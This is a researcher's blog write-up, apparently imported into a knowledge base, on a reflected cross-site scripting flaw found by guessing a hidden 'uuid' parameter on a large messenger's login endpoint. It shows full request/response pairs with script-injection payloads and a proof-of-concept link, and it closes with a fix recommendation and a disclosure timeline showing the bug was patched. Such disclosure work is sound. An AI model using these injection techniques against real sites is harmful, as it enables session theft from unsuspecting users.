---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-04-02_xss-in-large-messenger-and-payment-app-a-shout-out-to-parameter-guessing.md
original_filename: 2021-04-02_xss-in-large-messenger-and-payment-app-a-shout-out-to-parameter-guessing.md
title: XSS in Large Messenger and Payment App - a Shout Out to Parameter Guessing
category: documents
detected_topics:
- xss
- oauth
- command-injection
- api-security
tags:
- imported
- documents
- xss
- oauth
- command-injection
- api-security
language: en
raw_sha256: 1afbecb9cdc24758a74c0978cc06e12e60bd24d008f24f5e949307e203abda25
text_sha256: 071c231afba7f5d145f24ac99fca72bc4b4a17a0d463cbcde0b708b036c11c57
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# XSS in Large Messenger and Payment App - a Shout Out to Parameter Guessing

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-04-02_xss-in-large-messenger-and-payment-app-a-shout-out-to-parameter-guessing.md
- Source Type: markdown
- Detected Topics: xss, oauth, command-injection, api-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `1afbecb9cdc24758a74c0978cc06e12e60bd24d008f24f5e949307e203abda25`
- Text SHA256: `071c231afba7f5d145f24ac99fca72bc4b4a17a0d463cbcde0b708b036c11c57`


## Content

---
title: "XSS in Large Messenger and Payment App - a Shout Out to Parameter Guessing"
page_title: "(Web-)Insecurity Blog | XSS in Large Messenger and Payment App - a Shout Out to Parameter Guessing"
url: "https://security.lauritz-holtmann.de/post/xss-parameter-guessing/"
final_url: "https://security.lauritz-holtmann.de/post/xss-parameter-guessing/"
authors: ["Lauritz Holtmann (@_lauritz_)"]
bugs: ["XSS", "HTML injection"]
publication_date: "2021-04-02"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3771
---

POSTS April 2, 2021 3 min read 549 words

This is a post about a _Cross-Site-Scripting_ (XSS) vulnerability that was identified within the web version of a large Chinese messenger and payment platform. The vulnerability could have been missed easily, as the vulnerable parameter was manually guessed.

### Discovery

Recently, I was researching in the context of login flows, when I stumbled over the following interesting request and response:
  
  
  GET /jslogin?appid=wx782c26e4c19acffb&redirect_uri=https%3A%2F%2Fweb.redacted.com%2Fcgi-bin%2Fmmwebwx-bin%2Fwebwxnewloginpage&fun=new&lang=en_GB&_=1617048847643 HTTP/1.1
  Host: login.web.redacted.com
  Referer: https://web.redacted.com/
  [...]
  
  
  
  HTTP/1.1 200 OK
  Connection: close
  Content-Type: text/javascript
  Content-Type: text/html; charset=gbk
  Cache-Control: no-cache, must-revalidate
  Strict-Transport-Security: max-age=31536000
  Content-Length: 64
  
  window.QRLogin.code = 200; window.QRLogin.uuid = "Ia1oZupJlg==";
  

Without thinking too much, I went ahead and fiddled around with the present `GET` parameters.

As using the present parameters nothing too interesting was observed, I had a closer look at the actual response. What if it was possible to modify the values that are assigned to `window.QRLogin.code` or `window.QRLogin.uuid`? Appending a `uuid` parameter yielded quite surprising results! The value of this parameter was indeed reflected within the response of the application, **Bingo**!

At first I chose to inject arbitrary JavaScript as the response obviously holds JavaScript code. The following approach did work straightaway:
  
  
  GET /jslogin?appid=wx782c26e4c19acffb&redirect_uri=https%3A%2F%2Fweb.redacted.com%2Fcgi-bin%2Fmmwebwx-bin%2Fwebwxnewloginpage&fun=new&lang=en_GB&_=1617048184077&uuid=test123%22%3b%20alert(1)%3b%20var%20a%20%3d%20%22 HTTP/1.1
  Host: login.web.redacted.com
  Referer: https://web.redacted.com/
  [...]
  
  
  
  HTTP/1.1 200 OK
  Connection: close
  Content-Type: text/javascript
  Content-Type: text/html; charset=gbk
  Cache-Control: no-cache, must-revalidate
  Strict-Transport-Security: max-age=31536000
  Content-Length: 61
  
  window.QRLogin.code = 200; window.QRLogin.uuid = "test123"; alert(1); var a = "";
  

But this would most likely not leads to anything useful, as to perform a XSS attack with this behavior, a victim site would have to embed the script with a malicious GET parameter.

Did you notice that there are _two_ `Content-Type` headers present within the application’s response? As the latter header uses the `text/html` MIME type, what would happen if we inject HTML instead of JavaScript?

The next test I performed was the following:
  
  
  GET /jslogin?appid=wx782c26e4c19acffb&redirect_uri=https%3A%2F%2Fweb.redacted.com%2Fcgi-bin%2Fmmwebwx-bin%2Fwebwxnewloginpage&fun=new&lang=en_GB&_=1617048184077&uuid=%22<script>alert(document.domain)</script> HTTP/1.1
  Host: login.web.redacted.com
  Referer: https://web.redacted.com/
  [...]
  
  
  
  HTTP/1.1 200 OK
  Connection: close
  Content-Type: text/javascript
  Content-Type: text/html; charset=gbk
  Cache-Control: no-cache, must-revalidate
  Strict-Transport-Security: max-age=31536000
  Content-Length: 92
  
  window.QRLogin.code = 200; window.QRLogin.uuid = ""<script>alert(document.domain)</script>";
  

Or in short: [Link](https://login.web.redacted.com/jslogin?appid=wx782c26e4c19acffb&redirect_uri=https%3A%2F%2Fweb.redacted.com%2Fcgi-bin%2Fmmwebwx-bin%2Fwebwxnewloginpage&fun=new&lang=en_GB&_=1617048184077&uuid=%22%3Cscript%3Ealert\(document.domain\)%3C/script%3E).

And if this website is then browsed using a current Chrome, the injected JavaScript is executed: ![redacted rXSS](/images/advisories/chat-rXSS.png)

### Recommendation

For mitigating this issue, it was recommended to sanitize and/or encode user controlled contents in a context-aware manner. Apparently, the `uuid` should be independently chosen by the application, therefore, it should be ignored if a `uuid` parameter is present within the request.

### Tooling: Param Miner

Even though I was lucky to guess a valid hidden parameter, there are tools out there that automate this. One famous Burp Suite extension for this is the [Param Miner](https://github.com/PortSwigger/param-miner) by [James Kettle](https://twitter.com/albinowax).

After reporting the issue to the vendor, I was wondering whether the _Param Miner_ might have found the hidden parameter, too. A quick search within the GitHub Repo leads to the following entry in Param Miner’s word list: <https://github.com/PortSwigger/param-miner/blob/master/resources/params#L1379>.  
As the `uuid` parameter is in the word list, the _Param Miner_ would have found this issue, too.

### Responsible Disclosure

  * **2021-03-30** : Initial report to vendor via Security Response Center.
  * **2021-03-31** : The vulnerability is confirmed by vendor.
  * **2021-04-02** : The applied patch is confirmed to fix the vulnerability.

* * *

## References

  * Parm Miner Burp Suite Extension: <https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943>

* * *

* * *

Thank you for reading this post! If you have any feedback, feel free to reach out via [Mastodon](https://ruhr.social/@lauritz), [Twitter](https://twitter.com/_lauritz_) or [LinkedIn](https://linkedin.com/in/lauritz-holtmann). 🙂

You can directly tweet about this post using [this link](https://twitter.com/intent/tweet?url=https%3A%2F%2Fsecurity.lauritz-holtmann.de%2Fpost%2Fxss-parameter-guessing%2F&via=_lauritz_). 🤓

  * [Cross-Site Scripting](/tags/cross-site-scripting)
